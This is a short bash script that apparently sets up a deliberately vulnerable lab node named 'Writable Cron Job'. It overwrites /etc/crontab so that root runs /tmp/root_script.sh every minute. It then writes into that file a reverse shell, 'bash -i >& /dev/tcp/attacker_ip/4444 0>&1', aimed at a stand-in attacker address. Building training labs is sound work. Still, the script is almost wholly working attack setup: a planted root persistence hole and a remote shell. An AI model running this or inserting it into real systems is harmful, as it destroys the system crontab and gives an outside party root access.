#!/bin/bash
echo "[*] Setting up Node 2 (Writable Cron Job)..."
echo "* * * * * root /tmp/root_script.sh" > /etc/crontab
echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" > /tmp/root_script.sh
chmod +x /tmp/root_script.sh
echo "[+] Node 2 Ready: Writable cron job enabled."
